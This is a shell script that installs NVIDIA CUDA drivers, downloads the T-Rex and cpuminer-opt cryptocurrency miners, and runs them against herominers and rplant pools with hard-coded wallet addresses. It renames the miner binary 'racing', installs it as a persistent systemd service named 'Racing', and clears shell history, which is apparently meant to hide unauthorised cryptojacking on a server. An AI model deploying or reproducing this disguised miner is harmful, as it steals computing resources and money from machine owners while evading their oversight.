cd /home
myip="$(dig +short myip.opendns.com @resolver1.opendns.com)"
myworker+="xna"
noCore=$(nproc --all)
usingcore=$((noCore*90/100))
sudo apt-get install linux-headers-$(uname -r) -y
distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
sudo wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-$distribution.pin
sudo mv cuda-$distribution.pin /etc/apt/preferences.d/cuda-repository-pin-600
sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/7fa2af80.pub
sudo echo "deb http://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64 /" | sudo tee /etc/apt/sources.list.d/cuda.list
sudo apt-key del 7fa2af80
sudo rm /etc/apt/sources.list.d/cuda.list
sudo wget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/cuda-keyring_1.0-1_all.deb
sudo dpkg -i cuda-keyring_1.0-1_all.deb
sudo apt-get update
sudo apt-get -y install cuda-drivers
sudo apt-get install libcurl4 -y
sudo apt-get install cuda-drivers-515 -y
sudo apt-get install cuda-drivers-fabricmanager-515 -y
sudo systemctl enable nvidia-fabricmanager
sudo systemctl start nvidia-fabricmanager
sudo nvidia-smi mig -cgi 0 -C
sudo wget https://github.com/trexminer/T-Rex/releases/download/0.25.12/t-rex-0.25.12-linux.tar.gz
sudo tar -zxvf t-rex-0.25.12-linux.tar.gz
sudo mv t-rex racing
sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a kawpow -o stratum+tcp://de.aipg.herominers.com:1128 -u AHxt4DaEvNjpNyTi6E5UsaP1ERKYCDZgY8."'${myworker}_One_'" -p x\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
sudo systemctl daemon-reload
sudo systemctl enable racing.service
sudo ./racing -a kawpow -o stratum+tcp://de.aipg.herominers.com:1128 -u AHxt4DaEvNjpNyTi6E5UsaP1ERKYCDZgY8.${myworker}_One_ -p x &
history -c
if [[ $noCore -eq 6 ]]
then
	sudo wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.36/cpuminer-opt-linux.tar.gz
	sudo tar -xvf cpuminer-opt-linux.tar.gz
	sudo ./cpuminer-sse2 -a yespower  -o stratum+tcps://stratum-eu.rplant.xyz:17079 -u v6coUAbojgLAfLikCK3aLfha7zVC4gj5Jy.batch -p m=solo &
else
	sudo wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.36/cpuminer-opt-linux.tar.gz
	sudo tar -xvf cpuminer-opt-linux.tar.gz
	sudo ./cpuminer-sse2 -a yespower  -o stratum+tcps://stratum-eu.rplant.xyz:17079 -u v6coUAbojgLAfLikCK3aLfha7zVC4gj5Jy.batch1 -p m=solo &
fi
